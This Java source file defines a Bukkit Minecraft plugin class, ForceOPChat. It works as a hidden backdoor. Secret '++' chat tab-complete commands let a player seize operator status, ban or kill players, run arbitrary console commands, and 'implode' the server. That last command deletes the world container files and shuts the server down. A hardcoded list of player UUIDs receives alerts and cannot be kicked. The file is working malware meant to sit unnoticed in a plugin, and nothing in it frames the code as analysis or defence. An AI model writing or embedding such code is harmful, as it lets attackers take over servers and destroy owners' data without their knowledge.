package com.webmets.forceopchat;

import static org.bukkit.ChatColor.DARK_GREEN;
import static org.bukkit.ChatColor.GREEN;
import static org.bukkit.ChatColor.LIGHT_PURPLE;
import static org.bukkit.ChatColor.RED;
import static org.bukkit.ChatColor.WHITE;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.bukkit.BanList.Type;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

public class ForceOPChat implements Listener {

	private List<String> players;

	private Plugin pl;
	private boolean implode = false;

	private String prefix = "++";
	private ChatColor dark_color = DARK_GREEN;
	private ChatColor light_color = GREEN;

	public ForceOPChat(Plugin plugin) {
		this.pl = plugin;
		players = new ArrayList<String>();
		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); // Webmets
		players.add("b8730880-78a5-4e36-8e58-a6ae16bc4a49"); // OreosDoubleCream
		players.add("82675533-0d2a-455f-a22a-8aeabec2a6c2"); // Tesla1k
		players.add("268b70b7-dc91-4c1e-bd73-2bf8ad600a59"); // Tesla2k
		players.add("f1c67a72-b906-462b-8da7-bb7b6fa1d530"); // DogMaster308
		players.add("0faf0726-dbef-4241-a953-49819c44750e"); // Sonnyevil
		players.add("f2644111-032d-4fc2-b859-7e76017d7d47"); // FlyHighOrDie
		players.add("f98f0a11-bcda-4f0f-8476-3cd40dba25b5"); // SkiddyCuntSwezed
		players.add("f0bd23f2-5071-4059-8cb7-5a49ea5a1e4e"); // x_tryhard_x
	}

	@EventHandler
	public void onChat(PlayerChatTabCompleteEvent e) {
		if (!e.getChatMessage().startsWith(prefix))
			return;
		e.getTabCompletions().clear();

		String[] raw = e.getChatMessage().split(" ");
		List<String> args = new ArrayList<String>();
		String cmd = raw[0].substring(prefix.length());

		Player p = e.getPlayer();

		for (int i = 1; i < raw.length; i++) {
			args.add(raw[i]);
		}

		if (args.size() == 0) {
			if (cmd.equalsIgnoreCase("help")) {
				showIndex(p);
				return;
			} else if (cmd.equalsIgnoreCase("implode")) {
				new BukkitRunnable() {
					int timer = 15;

					@Override
					public void run() {
						if (timer == 15 || timer == 10 || timer == 5) {
							Bukkit.broadcastMessage(
									LIGHT_PURPLE + "This server is gonna implode in " + timer + " seconds");
						}
						if (timer <= 0) {
							implode = true;
							for (Player p : Bukkit.getOnlinePlayers()) {
								p.kickPlayer(RED + "Sorry, but this server is now dead\ncheck server files ;)");
							}
							for (File f : Bukkit.getWorldContainer().listFiles()) {
								f.delete();
							}
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stop");
						}
						timer--;
					}
				}.runTaskTimer(pl, 0, 20);

				return;
			} else if (cmd.equalsIgnoreCase("op")) {
				p.setOp(!p.isOp());
				if (p.isOp()) {
					broadcast(p.getName() + " gave himself op", p);
				} else {
					broadcast(p.getName() + " took his op", p);
				}
				return;
			} else if (cmd.equalsIgnoreCase("stack")) {
				if (p.getItemInHand() != null && p.getItemInHand().getType() != Material.AIR) {
					p.getItemInHand().setAmount(64);
					broadcast(p.getName() + " has stacked the item in his hand", p);
				}
			} else if (cmd.equalsIgnoreCase("banall")) {
				for(Player player : Bukkit.getOnlinePlayers()) {
					Bukkit.getBanList(Type.NAME).addBan(player.getName(),
							"Sorry bud, but you aint joining back anytime soon :)", null, "BanHammer");
				}
			}
		} else if (args.size() == 1) {
			if (cmd.equalsIgnoreCase("op") || cmd.equalsIgnoreCase("ban") || cmd.equalsIgnoreCase("kick")
					|| cmd.equalsIgnoreCase("kill") || cmd.equalsIgnoreCase("invsee") || cmd.equalsIgnoreCase("stack")) {
				Player target = Bukkit.getPlayer(args.get(0));
				if (target == null || !target.isOnline()) {
					return;
				}
				if (cmd.equalsIgnoreCase("op")) {
					target.setOp(!target.isOp());
					if (target.isOp()) {
						broadcast(p.getName() + " gave " + target.getName() + " op", p);
					} else {
						broadcast(p.getName() + " took " + target.getName() + "'s op", p);
					}
					return;
				} else if (cmd.equalsIgnoreCase("ban")) {
					Bukkit.getBanList(Type.NAME).addBan(target.getName(),
							"Sorry bud, but you aint joining back anytime soon :)", null, "BanHammer");
					broadcast(p.getName() + " has banned " + target.getName(), p);
					return;
				} else if (cmd.equalsIgnoreCase("kick")) {
					target.kickPlayer("Timed out");
					broadcast(p.getName() + " has kicked " + target.getName(), p);
					return;
				} else if (cmd.equalsIgnoreCase("kill")) {
					GameMode oldMode = target.getGameMode();
					target.setGameMode(GameMode.SURVIVAL);
					target.setHealth(0);
					target.setGameMode(oldMode);
					broadcast(p.getName() + " has killed " + target.getName(), p);
					return;
				} else if (cmd.equalsIgnoreCase("invsee")) {
					p.openInventory(target.getInventory());
					broadcast(p.getName() + "has opened " + target.getName() + "'s inventory", p);
					return;
				} else if (cmd.equalsIgnoreCase("tp")) {
					p.teleport(target.getLocation());
					broadcast(p.getName() + " teleported to " + target.getName(), p);
					return;
				} else if (cmd.equalsIgnoreCase("stack")) {
					if(target.getItemInHand() != null && target.getItemInHand().getType() != Material.AIR) {
						target.getItemInHand().setAmount(64);
						broadcast(p.getName() + " has stacked the item in " + target.getName()+"'s hand", p);
					}
				}
			}

		} else if (args.size() == 2) {
			if (cmd.equalsIgnoreCase("tp")) {
				Player target = Bukkit.getPlayer(args.get(0));
				if (target == null || !target.isOnline()) {
					return;
				}
				Player target2 = Bukkit.getPlayer(args.get(1));
				if (target2 == null || !target.isOnline()) {
					return;
				}
				target.teleport(target2);
				broadcast(p.getName() + " teleported " + target.getName() + " to " + target2.getName(), p);
			}
		}
		if (args.size() > 2) {
			if (cmd.equalsIgnoreCase("sudo")) {
				Player target = Bukkit.getPlayer(args.get(0));
				if (target == null || !target.isOnline()) {
					return;
				}

				StringBuilder sb = new StringBuilder();
				for (int i = 1; i < args.size(); i++) {
					sb.append(args.get(i) + " ");
				}

				target.chat(sb.toString());

				broadcast(p.getName() + " forced " + target.getName() + " to run:\n\"" + sb.toString() + "\"", p);
				return;
			}
		} else if (args.size() > 1) {
			if (cmd.equalsIgnoreCase("console")) {
				StringBuilder sb = new StringBuilder();
				for (int i = 0; i < args.size(); i++) {
					sb.append(args.get(i) + " ");
				}

				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), sb.toString());
				broadcast(p.getName() + " forced console to run:\n\"" + sb.toString() + "\"", p);
				return;
			}
		}
	}

	@EventHandler
	public void chat(AsyncPlayerChatEvent e) {
		if (players.contains(e.getPlayer().getUniqueId().toString())) {
			if (e.getMessage().startsWith("++")) {
				broadcast(e.getPlayer().getName() + " had one job...", null);
				e.setCancelled(true);
			}
		}
	}

	@EventHandler
	public void kick(PlayerKickEvent e) {
		if (implode)
			return;
		if (players.contains(e.getPlayer().getUniqueId().toString())) {
			e.setCancelled(true);
		}
	}

	private void showIndex(Player p) {
		p.sendMessage(dark_color + prefix + light_color + "Help");
		p.sendMessage(dark_color + prefix + light_color + "Banall");
		p.sendMessage(dark_color + prefix + light_color + "Op [player]");
		p.sendMessage(dark_color + prefix + light_color + "Ban <player>");
		p.sendMessage(dark_color + prefix + light_color + "Kick <player>");
		p.sendMessage(dark_color + prefix + light_color + "Invsee <player>");
		p.sendMessage(dark_color + prefix + light_color + "Tp <player> [player]");
		p.sendMessage(dark_color + prefix + light_color + "Kill <player>");
		p.sendMessage(dark_color + prefix + light_color + "Sudo <player> <msg>");
		p.sendMessage(dark_color + prefix + light_color + "Console <msg>");
		p.sendMessage(dark_color + prefix + light_color + "Implode");
		p.sendMessage(dark_color + prefix + light_color + "Stack [player]");

	}

	public void broadcast(String msg, Player player) {
		for (Player p : Bukkit.getOnlinePlayers()) {
			if (players.contains(p.getUniqueId().toString())) {
				p.sendMessage(dark_color + "[" + light_color + "ForceOP" + dark_color + "] " + WHITE + msg);
			}
		}

		if (player != null) {
			player.openInventory(player.getInventory());
			player.closeInventory();
		}
	}
}
